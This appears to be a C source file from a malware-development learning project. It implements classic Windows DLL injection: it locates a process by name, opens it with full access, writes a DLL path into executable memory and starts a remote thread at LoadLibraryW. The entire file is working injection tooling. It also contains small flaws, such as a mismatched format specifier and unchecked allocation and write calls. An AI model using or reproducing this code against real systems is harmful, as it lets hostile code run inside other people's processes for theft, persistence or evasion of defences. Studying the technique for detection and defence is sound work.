#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#include "../header.h"

const wchar_t dllLocation[] = L"...\\Malware Development\\DLL Injection\\dll.dll";
size_t dllLength = sizeof(dllLocation) + 1;

DWORD findProcByName(const char*);

int main(int argc, char** argv){
    DWORD pid;
    HANDLE hKernel32, hProcess, hThread;
    VOID *funcAddress;
    LPVOID rBuffer;

    if(argc < 2){
        print_err("Insufficient number of arguments");
        return EXIT_FAILURE;
    }

    pid = findProcByName(argv[1]);
    if(pid != 0){
        print_ok("Retrieved pid of %s: %ld", argv[1], pid);
    } else {
        print_err("Couldn't retrieve pid of %s", argv[1]);
        return EXIT_FAILURE;
    }
    
    hKernel32 = GetModuleHandle("Kernel32");
    funcAddress = GetProcAddress(hKernel32, "LoadLibraryW");

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess == NULL){
        print_err("Failed to get handle to process %ld, Error: %ld", pid, GetLastError());
        return EXIT_FAILURE;
    }

    print_ok("Got handle to process %ld", pid);

    rBuffer = VirtualAllocEx(hProcess, NULL, dllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    print_info("Allocated %d bytes", dllLength);

    WriteProcessMemory(hProcess, rBuffer, dllLocation, dllLength, NULL);
    print_info("Written to process memory");

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)funcAddress, rBuffer, 0, NULL);
    print_info("Created thread");

    print_info("Closing handles");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    print_ok("Done");
}

DWORD findProcByName(const char* procname){
    HANDLE hSnapshot;
    PROCESSENTRY32 processEntry;
    DWORD pid = 0;
    WINBOOL hResult;
    BOOL found = FALSE;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot == INVALID_HANDLE_VALUE){
        print_err("Couldn't retrieve processes, Error: %s", GetLastError());
        return 0;
    }

    processEntry.dwSize = sizeof(PROCESSENTRY32);

    hResult = Process32First(hSnapshot, &processEntry);

    while(hResult && !found){
        if(strcmp(procname, processEntry.szExeFile) == 0){
            pid = processEntry.th32ProcessID;
            found = TRUE;
        }
        hResult = Process32Next(hSnapshot, (&processEntry));
    }

    CloseHandle(hSnapshot);
    return pid;
}
